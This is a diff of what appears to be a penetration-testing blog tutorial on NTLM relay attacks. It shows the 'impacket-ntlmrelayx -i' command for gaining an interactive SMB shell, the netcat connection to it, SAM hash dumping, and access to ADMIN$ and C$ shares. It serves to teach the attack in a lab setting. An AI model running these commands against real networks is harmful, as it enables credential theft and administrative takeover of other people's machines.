@@ -30,19 +30,29 @@ The next thing is for our target, to create an event (We are gonna be utilizing 
 
 The authentication succeeded because SMB signing is enabled but not required and because “dtsarouchas” is the Administrator on this computer. Therefore, the SAM hashes were able to be dumped. Now the attacker can copy the SAM hashes, try cracking them offline and move laterally or vertically.
 
+***
 
-The attacker now will gain access to SMB interactive shell by using the `ntlmrelayx.py -tf targets.txt -smb2support -i` command.
+Same as we did in the previous section, we can simply get an interactive SMB shell by just adding a flag to ntlmrelayx command
 
-![Start-interactive-SMB-client-shell-via-TCP](https://dimitrios-tsarouchas.tech/assets/img/Start-interactive-SMB-client-shell-via-TCP.png)_Start interactive SMB client shell via TCP_
+```
+impacket-ntlmrelayx -tf targets -smb2support -i
+```
 
-Now the attacker has access to the interactive shell on 127.0.0.1:11000 and will access that SMB shell using the command `nc 127.0.0.1 11000`.
+-i will give the interactive shell. After running the command, you will see an output like below
 
-![Run-netcat-to-access-the-SMB-shell](https://dimitrios-tsarouchas.tech/assets/img/Run-netcat-to-access-the-SMB-shell.png)_Run netcat to access the SMB shell_
+![](https://www.hackingloops.com/wp-content/uploads/2023/01/6-2-1024x407.png)
 
-The attacker navigates to shares where he can find ADMIN$, C$, IPC$, and Share folders. Then he uses the C$ drive and lists the files this folder has in it.
+It has successfully exploited and started interactive SMB client shell via TCP on the specified port.
 
-![List-the-contents-of-C$-drive](https://dimitrios-tsarouchas.tech/assets/img/List-the-contents-of-C$-drive.png)_List the contents of C$ drive_
+To access the shell, you can simply use `nc` to connect to the host and port using the following command
 
-Going a step further, he uses the ADMIN$ folder where he can add files, get files, having full control on the administrator folder and subsequently to this computer.
+```
+nc 127.0.0.1 11000
+```
 
-![Listing-the-contents-of-the-ADMIN$-folder](https://dimitrios-tsarouchas.tech/assets/img/Listing-the-contents-of-the-ADMIN$-folder.png)_Listing the contents of the ADMIN$ folder_
+This will give you the SMB shell as below
+
+![](https://www.hackingloops.com/wp-content/uploads/2023/01/7-2.png)
+
+From here, you can interact using the shell and access the files and folders.
+
